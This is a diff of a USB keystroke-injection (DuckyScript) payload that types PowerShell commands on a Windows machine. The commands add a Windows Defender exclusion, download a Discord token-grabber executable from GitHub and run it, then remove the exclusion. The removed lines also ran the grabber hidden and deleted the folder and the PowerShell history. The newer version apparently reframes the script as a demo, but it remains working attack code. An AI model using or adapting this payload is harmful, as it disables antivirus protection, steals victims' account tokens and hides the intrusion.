@@ -7,16 +7,13 @@ ALT y
 DELAY 2000
 ENTER
 DELAY 500
-STRING cd C:\; mkdir temp; cd temp; Add-MpPreference -ExclusionPath "C:\temp"
+STRING cd C:\; mkdir DCIGROCKS; cd DCIGROCKS; Add-MpPreference -ExclusionPath "C:\DCIGROCKS"
 ENTER
 DELAY 500
-STRING $url = 'https://github.com/CharlesTheGreat77/token2Discord/raw/main/token2Discord.exe'; $file = 'C:\temp\life_insurance.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file -WindowStyle Hidden
+STRING $url = 'https://github.com/tarvergrant/sample-discord-grabber/raw/refs/heads/master/grabber/grabber.exe'; $file = 'C:\DCIGROCKS\demo.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file
 ENTER
-DELAY 20000
-STRING Remove-MpPreference -ExclusionPath "C:\temp"
-ENTER
-DELAY 500
-STRING rm -r temp ; Remove-Item (Get-PSreadlineOption).HistorySavePath
+DELAY 8000
+STRING Remove-MpPreference -ExclusionPath "C:\DCIGROCKS"
 ENTER
 STRING exit
 ENTER
